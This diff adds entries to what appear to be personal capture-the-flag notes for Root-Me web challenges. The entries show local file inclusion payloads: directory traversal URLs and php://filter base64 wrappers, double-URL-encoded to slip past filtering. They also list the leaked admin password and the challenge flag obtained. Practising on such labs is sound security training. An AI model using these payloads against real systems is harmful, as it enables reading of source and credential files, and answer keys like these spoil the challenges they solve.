@@ -106,7 +106,24 @@ change into: http://challenge01.root-me.org/web-serveur/ch52/?url=https://google
 
 
 
+21.	Local File Inclusion-Abbreviated LFI:	http://challenge01.root-me.org/web-serveur/ch16/?files=../
+											http://challenge01.root-me.org/web-serveur/ch16/?files=../admin&f=index.php
+	>>>$realm = 'PHP Restricted area';
+	   $users = array('admin' => 'OpbNJ60xYpvAQU8');
 
+
+22. Local File Inclusion - Double encoding: use php filter and double encode (url encode)
+					http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php://filter/convert.base64-encode/resource=home
+	 double -encode: http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252f%252ffilter%252fconvert%252ebase64-encode%252fresource%253Dhome
+			Base-64 -deoce resulf: <?php include("conf.inc.php"); ?>....
+
+					http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php://filter/convert.base64-encode/resource=conf
+	 double-encode: http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252f%252ffilter%252fconvert%252ebase64-encode%252fresource%253Dconf
+			Base-64 -decode resufl:	    "flag"        => "Th1sIsTh3Fl4g!",
+	>>>Th1sIsTh3Fl4g!
+	Note: "." double url decode: %252E
+		  "/" double url decode: %252F
+		  fuking méo để ý .
 
 
 
